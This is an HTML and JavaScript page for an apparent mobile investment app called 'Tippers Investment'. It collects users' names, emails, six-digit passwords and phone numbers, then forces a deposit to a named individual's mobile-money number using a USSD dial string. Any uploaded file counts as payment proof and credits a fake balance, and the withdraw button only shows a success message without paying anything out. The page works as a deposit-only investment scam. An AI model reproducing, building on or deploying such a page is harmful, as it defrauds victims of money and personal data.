<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Tippers Investment</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>

body{
margin:0;
font-family:Segoe UI;
background:#0f172a;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.app{
width:400px;
background:#111827;
border-radius:20px;
overflow:hidden;
color:white;
}

.header{
background:black;
padding:15px;
text-align:center;
font-weight:bold;
}

.content{
padding:15px;
height:520px;
overflow-y:auto;
}

.yellow{color:#facc15}

input,select{
width:100%;
padding:10px;
margin-top:6px;
border-radius:8px;
border:none;
outline:none;
background:#1f2937;
color:white;
}

input::placeholder{color:#9ca3af}

button{
width:100%;
padding:12px;
margin-top:12px;
border:none;
border-radius:10px;
background:#facc15;
font-weight:bold;
cursor:pointer;
color:black;
}

/* BOX */
.box{
background:#1f2937;
padding:12px;
border-radius:10px;
margin-top:10px;
}

.row{
display:flex;
gap:8px;
}

.row select,.row input{
flex:1;
margin-top:6px;
}

/* NAV */
.nav{
display:flex;
justify-content:space-around;
background:black;
padding:10px;
}

.nav div{
text-align:center;
font-size:12px;
cursor:pointer;
}

.nav i{
font-size:22px;
display:block;
}

.hidden{display:none}

#toastBox{
position:fixed;
bottom:20px;
left:50%;
transform:translateX(-50%);
background:black;
color:white;
padding:10px;
border-radius:8px;
display:none;
}

</style>
</head>

<body>

<div class="app">
<div class="header">Tippers Investment</div>
<div class="content" id="screen"></div>

<div class="nav hidden" id="bottomNav">
<div onclick="home()"><i>🏠</i>HOME</div>
<div onclick="deposit()"><i>💰</i>DEPOSIT</div>
<div onclick="withdrawUI()"><i>📤</i>WITHDRAW</div>
</div>
</div>

<div id="toastBox"></div>

<script>

let users=[];
let currentUser=null;
let depositDone=false;

/* TOAST */
function toast(msg){
let t=document.getElementById("toastBox");
t.innerText=msg;
t.style.display="block";
setTimeout(()=>t.style.display="none",2000);
}

/* REGISTER */
function register(){
get("screen").innerHTML=`

<h3 class="yellow">REGISTER</h3>

FIRST NAME:
<input id="fname" placeholder="John">

LAST NAME:
<input id="lname" placeholder="Doe">

GENDER (required):
<select id="gender">
<option value="">Select gender</option>
<option>Male</option>
<option>Female</option>
</select>

EMAIL:
<input id="email" placeholder="example@gmail.com">

PASSWORD (6 digits only):
<input id="pass" placeholder="123456">

CONFIRM PASSWORD:
<input id="cpass" placeholder="123456">

PHONE:
<div class="row">
<select id="code">
<option value="+250">RWA +250</option>
<option value="+254">KEN +254</option>
<option value="+256">UGA +256</option>
<option value="+255">TZA +255</option>
<option value="+1">USA +1</option>
<option value="+44">UK +44</option>
</select>

<input id="phone" placeholder="078xxxxxxx">
</div>

<button onclick="doRegister()">REGISTER</button>
`;
}

/* REGISTER VALIDATION */
function doRegister(){

let f=get("fname").value;
let l=get("lname").value;
let g=get("gender").value;
let e=get("email").value;
let p=get("pass").value;
let c=get("cpass").value;
let phone=get("phone").value;
let code=get("code").value;

/* REQUIRED CHECK */
if(!f||!l||!g||!e||!p||!c||!phone){
toast("Fill all fields ❌");
return;
}

/* PASSWORD RULE */
if(!/^[0-9]{6}$/.test(p)){
toast("INVALID PASSWORD ❌ (6 digits only)");
return;
}

if(p!==c){
toast("Passwords not match ❌");
return;
}

currentUser={email:e,pass:p,balance:0};
toast("Registered ✔");
login();
}

/* LOGIN */
function login(){
get("screen").innerHTML=`

<h3 class="yellow">LOGIN</h3>

<input id="logEmail" placeholder="Email">
<input id="logPass" placeholder="Password (6 digits)">

<button onclick="doLogin()">LOGIN</button>
`;
}

/* LOGIN VALIDATION */
function doLogin(){

let e=get("logEmail").value;
let p=get("logPass").value;

if(!e||!p){
toast("Fill all fields ❌");
return;
}

/* PASSWORD RULE */
if(!/^[0-9]{6}$/.test(p)){
toast("INVALID PASSWORD ❌");
return;
}

currentUser={email:e,balance:0};

get("bottomNav").classList.remove("hidden");

deposit(); // FORCE FLOW
}

/* HOME */
function home(){
if(!depositDone){
toast("Complete deposit first ❌");
deposit();
return;
}

get("screen").innerHTML=`
<div class="box">💰 Balance: ${currentUser.balance||0} RWF</div>
<div class="box">📊 Tips & Finance Guide</div>
<div class="box">📈 Market Insights</div>
<div class="box">🔥 Investment Growth Plan</div>
`;
}

/* DEPOSIT */
function deposit(){
get("screen").innerHTML=`

<h3 class="yellow">DEPOSIT BALANCE</h3>

AMOUNT (RWF):
<input id="amount" placeholder="100000">

<p>Minimum: 5,000 RWF</p>

SENDER NAME:
<input id="sender" placeholder="MUGABO">

<button onclick="payment()">CONTINUE</button>
`;
}

/* PAYMENT */
function payment(){
let amount=parseInt(get("amount").value);
let sender=get("sender").value;

if(!amount||amount<5000||!sender){
toast("Fill correctly ❌");
return;
}

get("screen").innerHTML=`

<h3 class="yellow">PAYMENT INFO</h3>

<div class="box">
Send money to:
<br><br>
0795410739
<br><br>
BARAKA BOLINGO
</div>

<button onclick="dial()">CONTINUE</button>
`;
}

/* DIAL */
function dial(){
get("screen").innerHTML=`

<div class="box">*182*1*1*0795410739#</div>

<input type="file" onchange="enable()">

<button id="btn" disabled onclick="proof()">SUBMIT</button>
`;
}

function enable(){
document.getElementById("btn").disabled=false;
}

/* PROOF */
function proof(){
currentUser.balance+=10000;
depositDone=true;
withdrawStep();
}

/* WITHDRAW */
function withdrawUI(){

let amt=prompt("Enter withdraw amount:");

if(!amt || amt<7500){
toast("INVALID INPUT ❌");
return;
}

get("screen").innerHTML=`

<h3 class="yellow">WITHDRAW</h3>

<div class="box">Amount: ${amt} RWF</div>

<div class="row">
<select id="code">
<option value="+250">RWA +250</option>
<option value="+254">KEN +254</option>
<option value="+256">UGA +256</option>
<option value="+255">TZA +255</option>
<option value="+1">USA +1</option>
<option value="+44">UK +44</option>
</select>

<input id="wphone" placeholder="078xxxxxxx">
</div>

<button onclick="toast('Withdraw sent ✔')">WITHDRAW</button>
`;
}

/* HELP */
function get(id){return document.getElementById(id);}

/* START */
register();

</script>

</body>
</html>
